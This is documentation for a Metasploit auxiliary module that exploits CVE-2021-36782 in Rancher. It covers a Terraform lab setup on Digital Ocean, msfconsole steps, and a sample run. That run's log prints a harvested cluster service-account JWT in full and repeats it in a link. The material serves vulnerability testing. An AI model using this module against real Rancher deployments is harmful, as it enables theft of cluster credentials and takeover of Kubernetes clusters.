## Vulnerable Application

An issue was discovered in Rancher versions up to and including
2.5.15 and 2.6.6 where sensitive fields, like passwords, API keys
and Ranchers service account token (used to provision clusters),
were stored in plaintext directly on Kubernetes objects like Clusters,
for example cluster.management.cattle.io. Anyone with read access to
those objects in the Kubernetes API could retrieve the plaintext
version of those sensitive data.

### Install

* Clone the repository from: https://github.com/fe-ax/tf-cve-2021-36782
* Create a Digital Ocean API Token
    * Log into Digital Ocean and navigate to: API > Tokens
    * Select "Generate New Token"
    * Enter a token name and then select either Full Access or Custom Scopes
        * If selecting Custom Scopes, use the values provided below
* Back in the `tf-cve-2021-36782`, copy the `example.tfvars` file to `yourown.tfvars`
* Edit `yourown.tfvars` and add the newly generated DO API token as `do_token`
    * Optionally set the region for the clusters to one closer to you (e.g. `nyc3`)
* Run `terraform init`
* Run `terraform apply -var-file yourown.tfvars`, this can take about 20 minutes to run
* Take the hostname from the `rancher_admin_url` output from terraform and use that as the `RHOST` value for the module
* Take the password from the `rancher_password` file and use that with the username "admin" for the module

#### Digital Ocean API Token Custom Scopes
It's possible that there are unnecessary privileges contained within the following settings, however it does permit the
test environment to start without a full access token.

* Fully Scoped Access:
    * 1click (2): create, read
    * account (1): read
    * actions (1): read
    * billing (1): read
    * kubernetes (5): create, read, update, delete, access_cluster
    * load_balancer (4): create, read, update, delete
    * monitoring (4): create, read, update, delete
    * project (4): create, read, update, delete
    * regions (1): read
    * registry (4): create, read, update, delete
    * sizes (1): read
* Create Access:
    * app / droplet / firewall / ssh_key
* Read Access:
    * app / block_storage / block_storage_action / block_storage_snapshot / cdn / certificate / database / domain / droplet / firewall / function / image / reserved_ip / snapshot / ssh_key / tag / uptime / vpc
* Update Access:
    * ssh_key

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/rancher_authenticated_api_cred_exposure`
1. Do: `set rhosts [ip]`
1. Do: `set username [username]`
1. Do: `set password [password]`
1. Do: `run`
1. If any API items of value are found, they will be printed

## Options

### Username

Username for Rancher. user must be in one or more of the following groups:

* `Cluster Owners`
* `Cluster Members`
* `Project Owners`
* `Project Members`
* `User Base`

### Password

Password for Rancher.

## Scenarios

### Docker Image

```
msf6 > use auxiliary/gather/rancher_authenticated_api_cred_exposure 
msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set rhosts rancher.178.62.209.204.sslip.io
rhosts => rancher.178.62.209.204.sslip.io
msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set username readonlyuser
username => readonlyuser
msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set password readonlyuserreadonlyuser
password => readonlyuserreadonlyuser
msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > set verbose true
verbose => true
msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > run
[*] Running module against 178.62.209.204

[*] Attempting login
[-] Auxiliary aborted due to failure: unreachable: 178.62.209.204:443 - Could not connect to web service - no response
[*] Auxiliary module execution completed
msf6 auxiliary(gather/rancher_authenticated_api_cred_exposure) > run
[*] Running module against 178.62.209.204

[*] Attempting login
[+] login successful, querying APIs
[*] Querying /v1/management.cattle.io.catalogs
[*] Querying /v1/management.cattle.io.clusters
[+] Found leaked key Cluster.Status.ServiceAccountToken: eyJhbGciOiJSUzI1NiIsImtpZCI6IndsUHhqR1pxX1dSbkFwVG92SFZ1RWV5WDNjbktDTmhZRVUtOFhWY2gyQ0kifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXR0bGUtc3lzdGVtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImtvbnRhaW5lci1lbmdpbmUtdG9rZW4taG52eG4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoia29udGFpbmVyLWVuZ2luZSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjgyOWZiN2FiLTA0NzItNDA1ZC1iOWI4LTRmNjhjYmZhNDAyMyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYXR0bGUtc3lzdGVtOmtvbnRhaW5lci1lbmdpbmUifQ.URiTKnslommru1NDTq-ClcSc9DBsQwr4_eqSCfksoIeGACwYKK3kPCxe0aVixOkWK9saFTcR46bEz7Of4BfMjUShBl89zSmaGHmlNvYd2sLssWMXbcQInC4Y7Ckti49VbBFoU5EWe-LBSiNrhZcNL6NTn00PgMlIT7OFiSugg8ar7k6Q1Suak0pW_ea1Z56bHGWD-WJM8GsYxohXX7HwYh8cyfOSd_jH6HTZ-p6qsZcWAHnREuzNwcdXqycDVxTA48XEZlfLOJDgvbyhNPssedf3os1rcWTQ5vh_NzUjyqpb8PzQOWm427XjMzBQxwSJVyu1a2TYlNXsLX9qCARjng
[*] Querying /v1/management.cattle.io.clustertemplates
[*] Querying /v1/management.cattle.io.notifiers
[*] Querying /v1/project.cattle.io.sourcecodeproviderconfig
[-] No response received from /v1/project.cattle.io.sourcecodeproviderconfig
[*] Querying /k8s/clusters/local/apis/management.cattle.io/v3/catalogs
[*] Querying /k8s/clusters/local/apis/management.cattle.io/v3/clusters
[-] No response received from /k8s/clusters/local/apis/management.cattle.io/v3/clusters
[*] Querying /k8s/clusters/local/apis/management.cattle.io/v3/clustertemplates
[*] Querying /k8s/clusters/local/apis/management.cattle.io/v3/notifiers
[*] Querying /k8s/clusters/local/apis/project.cattle.io/v3/sourcecodeproviderconfigs
[*] Auxiliary module execution completed
```

The [Cluster.Status.ServiceAccountToken](https://jwt.io/#debugger-io?token=eyJhbGciOiJSUzI1NiIsImtpZCI6IndsUHhqR1pxX1dSbkFwVG92SFZ1RWV5WDNjbktDTmhZRVUtOFhWY2gyQ0kifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJjYXR0bGUtc3lzdGVtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImtvbnRhaW5lci1lbmdpbmUtdG9rZW4taG52eG4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoia29udGFpbmVyLWVuZ2luZSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjgyOWZiN2FiLTA0NzItNDA1ZC1iOWI4LTRmNjhjYmZhNDAyMyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYXR0bGUtc3lzdGVtOmtvbnRhaW5lci1lbmdpbmUifQ.URiTKnslommru1NDTq-ClcSc9DBsQwr4_eqSCfksoIeGACwYKK3kPCxe0aVixOkWK9saFTcR46bEz7Of4BfMjUShBl89zSmaGHmlNvYd2sLssWMXbcQInC4Y7Ckti49VbBFoU5EWe-LBSiNrhZcNL6NTn00PgMlIT7OFiSugg8ar7k6Q1Suak0pW_ea1Z56bHGWD-WJM8GsYxohXX7HwYh8cyfOSd_jH6HTZ-p6qsZcWAHnREuzNwcdXqycDVxTA48XEZlfLOJDgvbyhNPssedf3os1rcWTQ5vh_NzUjyqpb8PzQOWm427XjMzBQxwSJVyu1a2TYlNXsLX9qCARjng) is actually a JWT token as seen in the link.
